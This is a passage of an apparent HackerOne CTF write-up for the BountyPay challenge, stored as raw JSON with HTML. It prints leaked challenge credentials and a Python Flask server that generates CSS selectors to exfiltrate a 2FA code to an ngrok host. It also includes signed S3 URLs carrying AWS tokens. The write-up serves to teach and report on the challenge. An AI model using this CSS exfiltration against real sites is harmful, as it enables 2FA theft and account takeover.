data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/QeusQjsiMjrKuAkrStnGJfDZ?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-06-09_02-26-29.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-06-09_02-26-29.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQZARQHHWQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070729Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBQWzuE8IbbbIcKuKCAVWHjExgkKEzVjBGDGEJEJkm2uAiEA0E2G6Bi5CCZvfaz4xkbWl%2FYyVr4wEViv8KeA%2B6Mx%2F4wqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDNAOLcaL61uNqnH2gCqRA0axLsf0gZzwel70GPHsBKQ%2B8tDatm5gG2E6UL3FFsta7sO%2BVtypwMA9X5rU0Hxbt%2BZD45O0fAcHO2eYH9aJRT6%2BWkboWqnrUVs3y3PursdkZG9D0s%2FLF%2FtmMI0qlsnhf5rUrGjIuAod0M%2BAVK5Jee5XjoBv2nWX451AYJ7x7TdP%2F6LuLExfdMPN83%2Fn8Z5EEe9I3zQlGrRUDnPpV3KBjTEEYEMf%2BLbfZubbTTMLkKKB5kvBB%2BnUDpvkR1dfNiAsacgxiyhMwtuVnE60hK9RQqlXDSBKS28FCDOiq5oUVVsYMFrOFjFTG5GvXudT2Lf1SFOE30GhOfUDbdcWQDOfNbqxfwEk3DSvUsZHmQ2YERAk1vfvZdgow7TCmz8dssjuzUvGn0%2FDZqF4HsuOs3BAPh%2FUzBr%2F1bXw6m0sKhkFT0hHKtt34aweZJ6OMTQUJfbgHm2x109ibVpkum9a2Y%2F5B8ycV7kPX9rtX%2FNF4jpY2wtPFJD0J4KrhjG9RkXDpPtJIiyKr6zHCzbtXUTKm8X4peEwMKiLq%2F8FOusBvoCV7CXv6D%2FHKI5Cfdbnykzwkk9RgXAw%2F2ivmEUivAHQJVvhdpJk8tOJOtZHe1qBfJT97TlikPwHbC%2ByhixDPYCBHqU9RNQ0G%2Fw4q6SY2zN516gfcPTtMUUZuuMs4Gf6cUwztkgdjXZ24fN2YfBLKfG9bjI54sEGYTemrmJWiPnf4Zp23612rg1SFLy28q9IJDIC5VZ0ihqVJEP78L5qGR9Wdq4u0JUyMsOD6XNtP%2FU09fIMfRJa8EiwRkmjjWMtIMgOiqGsIQRNc7WAmjk9JrSnnqGmuXaLzY5Hr%2F9a20FaJP45FbVkwXh1IQ%3D%3D\u0026amp;X-Amz-Signature=430816d2282b60032eb1ceaa851eee9ef9f9cf3f31f0f4013a1064e0c50f9a8a\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/QeusQjsiMjrKuAkrStnGJfDZ?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-06-09_02-26-29.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-06-09_02-26-29.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQZARQHHWQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070729Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBQWzuE8IbbbIcKuKCAVWHjExgkKEzVjBGDGEJEJkm2uAiEA0E2G6Bi5CCZvfaz4xkbWl%2FYyVr4wEViv8KeA%2B6Mx%2F4wqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDNAOLcaL61uNqnH2gCqRA0axLsf0gZzwel70GPHsBKQ%2B8tDatm5gG2E6UL3FFsta7sO%2BVtypwMA9X5rU0Hxbt%2BZD45O0fAcHO2eYH9aJRT6%2BWkboWqnrUVs3y3PursdkZG9D0s%2FLF%2FtmMI0qlsnhf5rUrGjIuAod0M%2BAVK5Jee5XjoBv2nWX451AYJ7x7TdP%2F6LuLExfdMPN83%2Fn8Z5EEe9I3zQlGrRUDnPpV3KBjTEEYEMf%2BLbfZubbTTMLkKKB5kvBB%2BnUDpvkR1dfNiAsacgxiyhMwtuVnE60hK9RQqlXDSBKS28FCDOiq5oUVVsYMFrOFjFTG5GvXudT2Lf1SFOE30GhOfUDbdcWQDOfNbqxfwEk3DSvUsZHmQ2YERAk1vfvZdgow7TCmz8dssjuzUvGn0%2FDZqF4HsuOs3BAPh%2FUzBr%2F1bXw6m0sKhkFT0hHKtt34aweZJ6OMTQUJfbgHm2x109ibVpkum9a2Y%2F5B8ycV7kPX9rtX%2FNF4jpY2wtPFJD0J4KrhjG9RkXDpPtJIiyKr6zHCzbtXUTKm8X4peEwMKiLq%2F8FOusBvoCV7CXv6D%2FHKI5Cfdbnykzwkk9RgXAw%2F2ivmEUivAHQJVvhdpJk8tOJOtZHe1qBfJT97TlikPwHbC%2ByhixDPYCBHqU9RNQ0G%2Fw4q6SY2zN516gfcPTtMUUZuuMs4Gf6cUwztkgdjXZ24fN2YfBLKfG9bjI54sEGYTemrmJWiPnf4Zp23612rg1SFLy28q9IJDIC5VZ0ihqVJEP78L5qGR9Wdq4u0JUyMsOD6XNtP%2FU09fIMfRJa8EiwRkmjjWMtIMgOiqGsIQRNc7WAmjk9JrSnnqGmuXaLzY5Hr%2F9a20FaJP45FbVkwXh1IQ%3D%3D\u0026amp;X-Amz-Signature=430816d2282b60032eb1ceaa851eee9ef9f9cf3f31f0f4013a1064e0c50f9a8a\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003cbr\u003e\nWhich contains passwords of bounty pay accounts. now we got the username and password of hackerone\u0026#39;s bountypay account.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eUsername: marten.mickos\nPassword : h\u0026amp;H5wy2Lggj*kKn4OD\u0026amp;Ype\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"level-6\"\u003eLevel - 6 ::\u003c/h1\u003e\n\n\u003cp\u003eNow we can login to hackerone\u0026#39;s bounty pay account using those creds on \u003cstrong\u003eapp.bountypay.h1ctf.com\u003c/strong\u003e, using 2FA bypass trich , that we did on level -1\u003cbr\u003e\nLoad the \u003cstrong\u003etransaction of May 2020\u003c/strong\u003e, we need to \u003cstrong\u003epay them\u003c/strong\u003e in order to \u003cstrong\u003efinish the challellege\u003c/strong\u003e.\u003cbr\u003e\nPayment : \u003ca title=\"https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba\" href=\"/redirect?url=https%3A%2F%2Fapp.bountypay.h1ctf.com%2Fpay%2F17538771%2F27cd1393c170e1e97f9507a5351ea1ba\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nTo pay there is an send challenge option. Which sends code to 2FA app. that request also takes \u003ccode\u003eapp_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css\u003c/code\u003e\u003cbr\u003e\nBy changing the value, we can load \u003cstrong\u003eour style\u003c/strong\u003e for that 2FA code. Now our aim is to leak the \u003cstrong\u003e7 digit 2FA\u003c/strong\u003e code using \u003cstrong\u003eCSS exfilteration\u003c/strong\u003e.\u003c/p\u003e\n\n\u003cp\u003eAfter some trails with \u003cstrong\u003etag names\u003c/strong\u003e using \u003cstrong\u003eresponsive nature of css\u003c/strong\u003e (background image), tried \u003cstrong\u003einput\u003c/strong\u003e tag. It responded with \u003cstrong\u003e7 requests\u003c/strong\u003e.\u003cbr\u003e\nNow tried to brute force the \u003cstrong\u003einput tag\u0026#39;s name **. Upto \u003ccode\u003ecode_\u003c/code\u003e there comes only **one request\u003c/strong\u003e.\u003cbr\u003e\nAfter that it responded with \u003cstrong\u003e1 to 7 values\u003c/strong\u003e. then got to understand the \u003cstrong\u003epattern of input name\u003c/strong\u003e like code_1, code_2, code_3, code_4, code_5, code_6, code_7.\u003cbr\u003e\nWe need to \u003cstrong\u003eleak all those seven codes\u003c/strong\u003e. As there is \u003cstrong\u003eeach input for each code\u003c/strong\u003e. it became quite simple for bruteforce.\u003c/p\u003e\n\n\u003ch2 id=\"final-payload-server-using-ngrok\"\u003eFinal payload server using ngrok.\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003eflask\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\n\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003eflask_cors\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eCORS\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ecross_origin\u003c/span\u003e\n\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003erequests\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eapp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eFlask\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003e__name__\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003estatic_folder\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003ecors\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eCORS\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eapp\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003eapp\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003econfig\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;CORS_HEADERS\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;Content-Type\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"o\"\u003e@\u003c/span\u003e\u003cspan class=\"n\"\u003ecross_origin\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003cspan class=\"o\"\u003e@\u003c/span\u003e\u003cspan class=\"n\"\u003eapp\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eroute\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/css/final.css\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003ecss_file\u003c/span\u003e\u003cspan class=\"p\"\u003e():\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eapp\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esend_static_file\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;check.css\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003erecord_file\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/tmp/record_\u003c/span\u003e\u003cspan class=\"si\"\u003e%\u003c/span\u003e\u003cspan class=\"s\"\u003es.txt\u0026quot;\u003c/span\u003e\n\n\u003cspan class=\"o\"\u003e@\u003c/span\u003e\u003cspan class=\"n\"\u003eapp\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eroute\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/recieve\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"o\"\u003e@\u003c/span\u003e\u003cspan class=\"n\"\u003ecross_origin\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003erecieve\u003c/span\u003e\u003cspan class=\"p\"\u003e():\u003c/span\u003e\n    \u003cspan class=\"n\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eargs\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;char\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"n\"\u003eplace\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eargs\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;place\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eplace\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39; - \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003echar\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;Done\u0026quot;\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eset_payload\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003efinal\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;check.css\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;a+\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"n\"\u003estring\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ePP\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$\u003c/span\u003e\u003cspan class=\"si\"\u003e%\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026amp;\u0026#39;()*+,-./:;\u0026lt;=\u0026gt;?@[]^_`{|}~ \u0026quot;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ep\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003ePP\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"n\"\u003estring\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"nb\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;$$\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;||\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nb\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eord\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e)))\u003c/span\u003e\n    \u003cspan class=\"n\"\u003efinal\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estring\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003efinal\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003engrok_url\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;https://87dc2cffc13b.ngrok.io\u0026quot;\u003c/span\u003e\n\u003cspan class=\"n\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;\u0026#39;\u0026#39;\ninput[name^=\u0026quot;code_!!\u0026quot;][value=\u0026quot;$$\u0026quot;] {\n    background-image:url(\u0026quot;\u003c/span\u003e\u003cspan class=\"si\"\u003e%\u003c/span\u003e\u003cspan class=\"s\"\u003es/recieve?value=||\u0026amp;char=$$\u0026amp;place=!!\u0026quot;);\n}\n\u0026#39;\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e%\u003c/span\u003e\u003cspan class=\"n\"\u003engrok_url\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003e__name__\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;__main__\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ewith\u003c/span\u003e \u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;check.css\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;w\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003eas\u003c/span\u003e \u003cspan class=\"n\"\u003eF\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"k\"\u003epass\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"nb\"\u003erange\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n        \u003cspan class=\"n\"\u003etemp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;!!\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nb\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eset_payload\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etemp\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eapp\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erun\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eJust \u003cstrong\u003eintercept\u003c/strong\u003e the request of \u003cstrong\u003esend_challenge (send 2FA)\u003c/strong\u003e and \u003cstrong\u003echange the app_style\u003c/strong\u003e to \u003ca title=\"https://87dc2cffc13b.ngrok.io/css/final.css\" href=\"/redirect?url=https%3A%2F%2F87dc2cffc13b.ngrok.io%2Fcss%2Ffinal.css\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://87dc2cffc13b.ngrok.io/css/final.css\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003cbr\u003e\nFrom \u003cstrong\u003epython server log\u003c/strong\u003e we can get the \u003cstrong\u003e7 digits\u003c/strong\u003e, we need to \u003cstrong\u003ecombine and enter on the site\u003c/strong\u003e. we have enough time for this [\u003cstrong\u003e2 min\u003c/strong\u003e]\u003cbr\u003e\n\u003cstrong\u003eBoom : )\u003c/strong\u003e\u003c/p\u003e\n\n\u003ch1 id=\"proof-of-concept\"\u003eProof of concept\u003c/h1\u003e\n\n\u003cp\u003eHere is the flag : ^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$\u003cbr\u003e\nScreenshot : \u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"Screenshot_from_2020-06-08_23-04-12.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/AyGY62cNRnD7wuECD897WWrJ?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-06-08_23-04-12.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-06-08_23-04-12.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQZARQHHWQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070729Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBQWzuE8IbbbIcKuKCAVWHjExgkKEzVjBGDGEJEJkm2uAiEA0E2G6Bi5CCZvfaz4xkbWl%2FYyVr4wEViv8KeA%2B6Mx%2F4wqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDNAOLcaL61uNqnH2gCqRA0axLsf0gZzwel70GPHsBKQ%2B8tDatm5gG2E6UL3FFsta7sO%2BVtypwMA9X5rU0Hxbt%2BZD45O0fAcHO2eYH9aJRT6%2BWkboWqnrUVs3y3PursdkZG9D0s%2FLF%2FtmMI0qlsnhf5rUrGjIuAod0M%2BAVK5Jee5XjoBv2nWX451AYJ7x7TdP%2F6LuLExfdMPN83%2Fn8Z5EEe9I3zQlGrRUDnPpV3KBjTEEYEMf%2BLbfZubbTTMLkKKB5kvBB%2BnUDpvkR1dfNiAsacgxiyhMwtuVnE60hK9RQqlXDSBKS28FCDOiq5oUVVsYMFrOFjFTG5GvXudT2Lf1SFOE30GhOfUDbdcWQDOfNbqxfwEk3DSvUsZHmQ2YERAk1vfvZdgow7TCmz8dssjuzUvGn0%2FDZqF4HsuOs3BAPh%2FUzBr%2F1bXw6m0sKhkFT0hHKtt34aweZJ6OMTQUJfbgHm2x109ibVpkum9a2Y%2F5B8ycV7kPX9rtX%2FNF4jpY2wtPFJD0J4KrhjG9RkXDpPtJIiyKr6zHCzbtXUTKm8X4peEwMKiLq%2F8FOusBvoCV7CXv6D%2FHKI5Cfdbnykzwkk9RgXAw%2F2ivmEUivAHQJVvhdpJk8tOJOtZHe1qBfJT97TlikPwHbC%2ByhixDPYCBHqU9RNQ0G%2Fw4q6SY2zN516gfcPTtMUUZuuMs4Gf6cUwztkgdjXZ24fN2YfBLKfG9bjI54sEGYTemrmJWiPnf4Zp23612rg1SFLy28q9IJDIC5VZ0ihqVJEP78L5qGR9Wdq4u0JUyMsOD6XNtP%2FU09fIMfRJa8EiwRkmjjWMtIMgOiqGsIQRNc7WAmjk9JrSnnqGmuXaLzY5Hr%2F9a20FaJP45FbVkwXh1IQ%3D%3D\u0026amp;X-Amz-Signature=de444a494dfdca6f913e3eea28dedfe859b2e1ecac559ba7a8c7050792184971\" data-attachment-type=\"image/png\"\u003eScreenshot_from_2020-06-08_23-04-12.png (F859448)\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAccess over payments account.\u003c/p\u003e\n","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":859448,"file_name":"Screenshot_from_2020-06-08_23-04-12.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/AyGY62cNRnD7wuECD897WWrJ?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-06-08_23-04-12.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-06-08_23-04-12.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZARQHHWQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070729Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBQWzuE8IbbbIcKuKCAVWHjExgkKEzVjBGDGEJEJkm2uAiEA0E2G6Bi5CCZvfaz4xkbWl%2FYyVr4wEViv8KeA%2B6Mx%2F4wqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDNAOLcaL61uNqnH2gCqRA0axLsf0gZzwel70GPHsBKQ%2B8tDatm5gG2E6UL3FFsta7sO%2BVtypwMA9X5rU0Hxbt%2BZD45O0fAcHO2eYH9aJRT6%2BWkboWqnrUVs3y3PursdkZG9D0s%2FLF%2FtmMI0qlsnhf5rUrGjIuAod0M%2BAVK5Jee5XjoBv2nWX451AYJ7x7TdP%2F6LuLExfdMPN83%2Fn8Z5EEe9I3zQlGrRUDnPpV3KBjTEEYEMf%2BLbfZubbTTMLkKKB5kvBB%2BnUDpvkR1dfNiAsacgxiyhMwtuVnE60hK9R